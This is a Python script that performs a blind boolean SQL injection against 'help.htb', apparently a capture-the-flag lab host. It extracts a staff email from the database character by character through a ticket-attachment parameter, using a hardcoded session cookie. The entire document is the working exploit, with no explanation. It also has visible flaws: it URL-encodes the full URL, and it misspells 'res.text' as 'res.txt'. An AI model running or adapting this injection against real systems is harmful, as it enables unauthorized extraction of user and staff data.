import requests
import string
import sys
import os
from urllib.parse import quote
#clear = lambda: sys.stdout.flush()

charset = string.ascii_lowercase + string.digits
charset += "@_."
#charset += string.punctuation
fail = 'Page not found'
success = ''
headers={
    'Cookie':'PHPSESSID=2l6hoe5drvdtq9991ib5c8bjj4'
    #'Content-Type': 'application/json'
}
result = ''
i = 1
while True:
    prev_result = result
    for char in charset:
        url = f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6+and+substr((select+email+from+staff+limit+0,1),{i},1)+%3d+'{char}'--+-"
        url = quote(url)
        res = requests.get(url, headers=headers)
        #data = {
        #}
        #res = requests.post(url, headers=headers, data=data)
        if fail:
            if fail in res.text:
                continue
            else:
                result += char
                i += 1
                break
        elif success:
            if success in res.txt:
                result += char
                i += 1
                break
        else:
            print("Must set fail or success variable")
            sys.exit(1)

    print(result)
    if prev_result == result:
        break

